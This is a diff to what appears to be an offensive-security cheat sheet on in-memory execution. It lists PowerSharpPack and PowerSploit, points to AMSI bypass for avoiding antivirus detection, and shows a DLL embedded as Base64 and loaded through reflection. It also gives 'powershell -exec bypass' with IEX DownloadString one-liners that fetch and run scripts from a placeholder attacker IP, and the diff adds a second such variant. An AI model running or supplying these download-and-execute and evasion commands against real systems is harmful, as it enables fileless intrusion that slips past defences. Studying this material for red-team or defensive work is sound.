@@ -154,7 +154,7 @@ There are several methods to load straight into memory .Net Assemblies (PE and D
 Examples of PowerShell scripts that can be used to load remote .NET assemblies (PE and DLL) and shellcodes straight into memory
 --------------------------------------------------------------------------------------------------------------------------------
 
-=> PowerSharpPack is a tool with many useful offensive CSharp Projects wraped into one PowerShell script that can be remotely loaded into memory for easy usage.
+=> PowerSharpPack is a tool with many useful offensive CSharp Projects (mostly PEs) wraped into one PowerShell script that can be remotely loaded into memory for easy usage.
    + https://github.com/S3cur3Th1sSh1t/PowerSharpPack
    
 => The PowerShell script 'PowerLoader.ps1' builds script block which safely loads into-memory remote PowerShell script, .NET assemblies, and shellcodes.
@@ -164,7 +164,7 @@ Examples of PowerShell scripts that can be used to load remote .NET assemblies (
    + https://github.com/PowerShellMafia/PowerSploit/CodeExecution/
    
 
-In addtion, below are some examples of PowerShell commands that allow us to manually download and inject straight into memory remote .Net Assemblies (PE and DLL)
+In addtion, below are some examples of PowerShell commands that allow to manually download and inject straight into memory remote .Net Assemblies (PE and DLL)
 and PowerShell scripts.
 Keep in mind that to avoid AV detection it will necessary to bypass the AMSI (Refer to the next section).
 
@@ -196,12 +196,12 @@ PS C:\temp> $method.Invoke(0, $null)
 OR
 
 + Step 1 - Get a Base64 encoded string of the DLL
-  [convert]::ToBase64String((Get-Content -path "C:\PATH\MyLibrary.dll" -Encoding byte))
+PS C:\temp> [convert]::ToBase64String((Get-Content -path "C:\PATH\MyLibrary.dll" -Encoding byte))
 
 + Step 2 - Embed assembly string in script 
-  $dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAA...'
-  $bytes = [System.Convert]::FromBase64String($dll)
-  [System.Reflection.Assembly]::Load($bytes)
+PS C:\temp> $dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAA...'
+PS C:\temp> $bytes = [System.Convert]::FromBase64String($dll)
+PS C:\temp> [System.Reflection.Assembly]::Load($bytes)
 
 
 Example - "Manually"Download and execute a scripts straight into memory using PowerShell
@@ -210,6 +210,11 @@ Example - "Manually"Download and execute a scripts straight into memory using Po
  PS C:\temp> powershell -exec bypass
  PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://YOUR_IP_ADDRESS/Your-PowerShell-Script.ps1'); Your-PowerShell-script-function-name
 
+ OR
+ 
+ PS C:\temp> powershell -exec bypass
+ PS C:\temp> $payload = 'http://Your-IP-address/PowerShell-Script.ps1'
+ PS C:\temp> IEX (New-Object Net.WebClient).DownloadString($payload);
 
 
 ================================================================================================================================================
